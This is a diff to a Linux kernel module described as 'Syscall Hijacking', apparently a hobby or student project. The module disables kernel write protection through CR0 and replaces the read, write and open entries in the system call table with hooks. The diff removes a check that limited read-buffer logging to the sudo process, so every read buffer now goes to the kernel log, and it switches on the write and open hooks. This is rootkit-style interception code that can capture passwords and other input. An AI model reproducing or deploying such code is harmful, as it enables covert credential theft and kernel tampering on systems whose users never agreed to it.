@@ -14,7 +14,7 @@ MODULE_LICENSE( "GPL" );
 MODULE_AUTHOR( "galleg_a" );
 MODULE_DESCRIPTION( "Syscall Hijacking" );
 
-unsigned long **sys_call_table;
+unsigned long	**sys_call_table;
 
 asmlinkage int ( *original_write ) ( unsigned int, const char __user *, size_t );
 asmlinkage int ( *original_read ) ( unsigned int, const char __user *, size_t );
@@ -28,8 +28,7 @@ asmlinkage int	new_write( unsigned int fd, const char __user *buf, size_t count 
 
 asmlinkage int	new_read( unsigned int fd, const char __user *buf, size_t count )
 {
-  if ( strcmp( current->comm, "sudo" ) == 0 )
-    printk( KERN_EMERG "read ===> %s\n", buf );
+  printk( KERN_EMERG "read ===> %s\n", buf );
   return ( *original_read )( fd, buf, count );
 }
 
@@ -54,7 +53,7 @@ static void		aquire_sys_call_table( void )
 
 static void	allow_writing( void )
 {
-  write_cr0( read_cr0() & ( ~ 0x10000 ));
+  write_cr0( read_cr0() & ~0x10000 );
 }
 
 static void	disallow_writing( void )
@@ -66,13 +65,13 @@ static int	init_mod( void )
 {
   aquire_sys_call_table();
 
-  //original_write = ( void * ) sys_call_table[ __NR_write ];
+  original_write = ( void * ) sys_call_table[ __NR_write ];
   original_read = ( void * ) sys_call_table[ __NR_read ];
-  //original_open = ( void * ) sys_call_table[ __NR_open ];
+  original_open = ( void * ) sys_call_table[ __NR_open ];
   allow_writing();
-  //sys_call_table[ __NR_write ] = ( unsigned long * ) new_write;
+  sys_call_table[ __NR_write ] = ( unsigned long * ) new_write;
   sys_call_table[ __NR_read ] = ( unsigned long * ) new_read;
-  //sys_call_table[ __NR_open ] = ( unsigned long * ) new_open;
+  sys_call_table[ __NR_open ] = ( unsigned long * ) new_open;
   disallow_writing();
 
   return 0;
@@ -81,9 +80,9 @@ static int	init_mod( void )
 static void	exit_mod( void )
 {
   allow_writing();
-  //sys_call_table[ __NR_write ] = ( unsigned long * ) original_write;
+  sys_call_table[ __NR_write ] = ( unsigned long * ) original_write;
   sys_call_table[ __NR_read ] = ( unsigned long * ) original_read;
-  //sys_call_table[ __NR_open ] = ( unsigned long * ) original_open;
+  sys_call_table[ __NR_open ] = ( unsigned long * ) original_open;
   disallow_writing();
 }
 
